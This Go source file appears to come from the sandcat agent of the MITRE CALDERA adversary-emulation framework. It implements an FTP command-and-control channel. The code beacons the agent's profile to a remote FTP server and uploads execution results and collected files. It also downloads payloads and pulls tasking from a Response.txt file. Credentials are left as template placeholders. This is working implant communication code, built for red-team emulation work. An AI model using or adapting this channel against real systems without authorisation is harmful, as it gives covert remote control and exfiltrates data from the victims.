package contact

import (
    "encoding/json"
    "fmt"
    "io/ioutil"
    "math/rand"
    "strconv"
    "time"
    "errors"
    "bytes"

    "github.com/jlaffaye/ftp"
    "github.com/mitre/gocat/output"
)

const (
    USER = "{FTP_C2_USER}"
    PWORD = "{FTP_C2_PASSWORD}"
    DIRECTORY = "{FTP_C2_DIRECTORY}"
)

//API communicates through FTP
type FTP struct {
    name string
    ipAddress string
    client *ftp.ServerConn
    user string
    pword string
    directory string
}

func init() {
    CommunicationChannels["FTP"] = &FTP{ name: "FTP" }
}

//GetBeaconBytes sends a beacon and returns instructions
func (f *FTP) GetBeaconBytes(profile map[string]interface{}) []byte {
    var retProfile []byte
    retBytes, heartbeat := f.FtpBeacon(profile)
    if heartbeat == true {
	    retProfile = retBytes
	}
    return retProfile
}

//GetPayloadBytes fetch payload bytes from ftp server
func (f *FTP) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
    var err error

    payloadReqDict, paw, err := CreatePayloadRequest(profile, payloadName)
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error creating payload dictionary: %s", err.Error()))
        return nil, ""
    }
    data, err := f.DownloadPayload(paw, payloadReqDict, payloadName)
    if err != nil {
    	output.VerbosePrint(fmt.Sprintf("[-] Failed to download payload file: %s", err.Error()))
    	return nil, ""
    }
	return data, payloadName
}

//C2RequirementsMet determines if sandcat can use the selected comm channel
func (f *FTP) C2RequirementsMet(profile map[string]interface{}, c2Config map[string]string) (bool, map[string]string) {
    config := make(map[string]string)
    if len(profile["paw"].(string)) == 0 {
        config["paw"] = getBeaconNameIdentifier()
    }
    return true, config
}

//SendExecutionResults send results to the server
func (f *FTP) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}) {
	profileCopy := make(map[string]interface{})
	for k,v := range profile {
		profileCopy[k] = v
	}
	results := [1]map[string]interface{}{result}
	profileCopy["results"] = results

	data, err := json.Marshal(profileCopy)
	if err == nil{
	    err = f.UploadFileBytes(profile, "Alive.txt", data)
	    if err != nil{
	        output.VerbosePrint(fmt.Sprintf("[-] Failed to upload file bytes for SendExecutionResults: %s", err.Error()))
	    }
	}
}

//Return 'ftp'
func (f *FTP) GetName() string {
	return f.name
}

//Return upstreamDestAddr
func (f *FTP) SetUpstreamDestAddr(upstreamDestAddr string) {
    f.ipAddress = upstreamDestAddr
    f.user = USER
	f.pword = PWORD
	f.directory = DIRECTORY

	client, errConnect := ftp.Dial(f.ipAddress)
	if errConnect != nil {
        output.VerbosePrint(fmt.Sprintf("[-] Failed to connect to FTP server: %s", errConnect.Error()))
    }
    f.client = client

    if f.user != "" {
        err := f.client.Login(f.user, f.pword)
        if err != nil {
            output.VerbosePrint(fmt.Sprintf("[-] Failed to login to FTP server: %s", errConnect.Error()))
        }
    }
}

//Upload file found by agent to server
func (f *FTP) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
	paw := profile["paw"].(string)
	uniqueFileName := uploadName
	if uploadName != "Alive.txt"{
	    uploadId := getNewUploadId()
	    uniqueFileName = uploadName + "-" + uploadId
	}

    errConn := f.ServerSetDir(paw)
    if errConn != nil{
	    output.VerbosePrint(fmt.Sprintf("[-] Failed to connect to FTP Server: %s", errConn.Error()))
        return errConn
    }

	connect := f.UploadFile(uniqueFileName, data)
	if connect != nil {
		return connect
	}

	return nil
}

func CreatePayloadRequest(profile map[string]interface{}, payloadName string) ([]byte, string, error) {
    platform := profile["platform"]
    paw := profile["paw"]
    if platform == nil && paw == nil {
    	output.VerbosePrint("[!] Error obtaining payload - profile missing paw and/or platform.")
    	return nil, "", errors.New("profile does not contain platform and/or paw")
    }

    payloadReqDict := map[string]string{
    	"file": payloadName,
    	"platform": platform.(string),
    	"paw": paw.(string),
        }
    data, err := json.Marshal(payloadReqDict)
    if err != nil {
    	output.VerbosePrint(fmt.Sprintf("[-] Failed to json marshal payload request map: %s", err.Error()))
	return nil, "", err
    }

    return data, paw.(string), nil
}

//Connect to ftp server with username and password
func (f *FTP) ServerSetDir(paw string) error {
    if err := f.client.ChangeDir(f.directory + "/" + paw); err != nil {
        if err := f.client.MakeDir(f.directory + "/" + paw); err != nil{
            return err
        }
        f.client.ChangeDir(f.directory+"/"+paw)
    }

    return nil
}

//Control process to download file from server
func (f *FTP) DownloadPayload(paw string, payloadReq []byte, fileName string) ([]byte, error) {
    errConn := f.ServerSetDir(paw)
    if errConn != nil{
        output.VerbosePrint(fmt.Sprintf("[-] Failed to connect to FTP Server: %s", errConn.Error()))
        return nil, errConn
   }
    connect := f.UploadFile("Payload.txt", payloadReq)
    if connect != nil {
        output.VerbosePrint("[!] Error sending payload request to FTP Server")
        return nil, errConn
    }

    data, err := f.DownloadFile(fileName)
    if err != nil{
        output.VerbosePrint(fmt.Sprintf("[-] Failed to download file from FTP Server: %s", err.Error()))
        return nil, err
    }

    return data, nil
}

//Controls process to send beacon to server
func (f *FTP) FtpBeacon(profile map[string]interface{}) ([]byte, bool) {
    data, heartbeat := json.Marshal(profile)
    if heartbeat != nil{
        output.VerbosePrint("[!] Error converting profile map to String - cannot send beacon")
        return nil, false
    }

    connect := f.UploadFileBytes(profile, "Alive.txt", data)
	if connect != nil {
	    output.VerbosePrint("[!] Error sending beacon to FTP Server")
		return nil, false
	}

    data, err := f.DownloadFile("Response.txt")
	if err != nil{
	    output.VerbosePrint(fmt.Sprintf("[-] Failed to download file from FTP Server: %s", err.Error()))
        return nil, false
    }
	return data, true

}

//Upload file to server
func (f *FTP) UploadFile(filename string, data []byte) error {
    //newData := bytes.NewBufferString(data)
    reader := bytes.NewReader(data)
    return f.client.Stor(filename, reader)
}

//Download file from server
func (f *FTP) DownloadFile(filename string) ([]byte,error) {
    reader, err := f.client.Retr(filename)
    defer reader.Close()
    if err != nil {
        return nil, err
    }
    data, errRead := ioutil.ReadAll(reader)
    if errRead != nil {
        return nil, errRead
    }
    if filename == "Response.txt"{
        f.client.Delete(filename)
        f.client.Delete("Alive.txt")
    }

    return data, nil
}

//If no paw, create one
func getBeaconNameIdentifier() string {
	rand.Seed(time.Now().UnixNano())
	return strconv.Itoa(rand.Int())
}

//Create unique id for file upload
func getNewUploadId() string {
	rand.Seed(time.Now().UnixNano())
	return strconv.Itoa(rand.Int())
}